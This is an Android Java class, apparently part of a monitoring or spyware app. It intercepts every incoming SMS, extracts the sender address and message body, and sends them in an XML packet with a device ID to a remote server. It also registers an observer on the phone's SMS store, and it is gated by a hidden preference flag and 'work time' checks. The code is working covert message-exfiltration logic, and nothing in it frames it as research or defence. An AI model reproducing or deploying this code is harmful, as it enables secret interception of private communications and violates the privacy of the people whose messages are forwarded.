package com.inet.android.sms;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.inet.android.bs.RequestMakerImpl;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

public class SMSBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = "SMS";
	private SmsSentObserver smsSentObserver = null;
	String str = "";
	SharedPreferences sp;
	private Context mContext;
	private Bundle mBundle;
	String dir = null;
	RequestMakerImpl req;

	public void onReceive(Context context, Intent intent) {
		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
		sp = PreferenceManager.getDefaultSharedPreferences(context);
		String sms = sp.getString("KBD", "0");

		if (sms.equals("0")) {
			Logging.doLog(TAG, "KBD = 0", "KBD = 0");
			return;
		}

		boolean isWork = WorkTimeDefiner.isDoWork(context);
		if (!isWork) {
			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
					"isWork return " + Boolean.toString(isWork));

			return;
		} else {
			Logging.doLog(TAG, Boolean.toString(isWork), Boolean.toString(isWork));
		}
		try {
			mContext = context;
			mBundle = intent.getExtras();
			// smsSentObserver = null;
			Log.d(TAG, "Intent Action : " + intent.getAction());
			getSMSDetails();

			if (smsSentObserver == null) {
				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
				mContext.getContentResolver().registerContentObserver(
						Uri.parse("content://sms"), true, smsSentObserver);
			}
		} catch (Exception sgh) {
			Logging.doLog(TAG, "Error in Init : " + sgh.toString(), "Error in Init : " + sgh.toString());
		}
	}

	@SuppressLint("SimpleDateFormat")
	private void getSMSDetails() {
		SmsMessage[] msgs = null;

		try {
			Object[] pdus = (Object[]) mBundle.get("pdus");
			if (pdus != null) {
				dir = "вх. Sms";
				msgs = new SmsMessage[pdus.length];

				StringBuilder bodyText = new StringBuilder();
				for (int k = 0; k < msgs.length; k++) {
					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);

					Log.d(TAG,
							"getDisplayMessageBody : "
									+ msgs[k].getDisplayMessageBody());
					Log.d(TAG,
							"getDisplayOriginatingAddress : "
									+ msgs[k].getDisplayOriginatingAddress());
					Log.d(TAG, "getMessageBody : " + msgs[k].getMessageBody());
					Log.d(TAG,
							"getOriginatingAddress : "
									+ msgs[k].getOriginatingAddress());
				
				}
				String adress = msgs[0].getOriginatingAddress();

				for (int i = 0; i < msgs.length; i++) {
					bodyText.append(msgs[i].getMessageBody());
				}
				// -------send sms--------------------------------
				String sendStr = "<packet><id>" + sp.getString("ID", "ID")
						+ "</id><time>" + logTime()
						+ "</time><type>4</type><app>" + dir + "</app><ttl>"
						+ adress + "</ttl><cdata1>" + bodyText.toString()
						+ "</cdata1><ntime>" + "30" + "</ntime></packet>";

//				req = new RequestMakerImpl(mContext);
//				req.sendDataRequest(sendStr);
				
				DataRequest dr = new DataRequest(mContext);
				dr.sendRequest(sendStr);
				
				Logging.doLog(TAG, sendStr, sendStr);

			}
		} catch (Exception sfgh) {
			Logging.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(), "Error in getSMSDetails : " + sfgh.toString());
		}
	}

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}
